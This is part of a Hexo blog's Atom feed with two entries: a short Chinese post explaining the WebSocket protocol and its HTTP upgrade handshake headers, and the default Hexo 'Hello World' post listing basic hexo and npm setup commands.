    <content type="html"><![CDATA[<p>WebSocket是一种双向全双工的应用层协议，通常用在要求低延迟或需要服务器主动发送请求的地方。WSS与WS就像HTTPS与HTTP的关系一样，多了TLS加密层。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;wss://xxx.com/func&quot;</span>);</span><br></pre></td></tr></table></figure><p>首次建立WS连接时会通过HTTP协议握手协商：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/func</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.com</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive, Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span>: websocket</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span>: 13</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span>: QKVMhgEVGz7jTFD5PIizrQ==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">101</span> Switching Protocol</span><br><span class="line"><span class="attribute">Connection</span>: Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span>: websocket</span><br><span class="line"><span class="attribute">Sec-WebSocket-Accept</span>: GUgfO45/U2Oo5uUkpUR3jnm3zcA=</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>Connection</code>与<code>Upgrade</code>表明这是WS握手，<code>Sec-WebSocket-Version</code>表示客户端希望使用的版本，<code>Sec-WebSocket-Key</code>为随机产生的Base64编码，<code>Sec-WebSocket-Accept</code>会响应该随机值的哈希。</p><p>握手成功后便可基于WS协议传输任意格式的数据，常用JSON：<code>ws.send(&#123;&quot;a&quot;: 1&#125;);</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;WebSocket是一种双向全双工的应用层协议，通常用在要求低延迟或需要服务器主动发送请求的地方。WSS与WS就像HTTPS与HTTP的关系一样，多了TLS加密层。&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="WS" scheme="https://hosch3n.github.io/tags/WS/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://hosch3n.github.io/2020/08/16/hello-world/"/>
    <id>https://hosch3n.github.io/2020/08/16/hello-world/</id>
    <published>2020-08-15T16:00:00.000Z</published>
    <updated>2021-01-10T10:01:22.912Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h3 id="Addition-modules"><a href="#Addition-modules" class="headerlink" title="Addition modules"></a>Addition modules</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-scss --save</span><br><span class="line">npm install hexo-renderer-swig --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br><span class="line">hexo new page categories</span><br><span class="line">hexo new page about</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
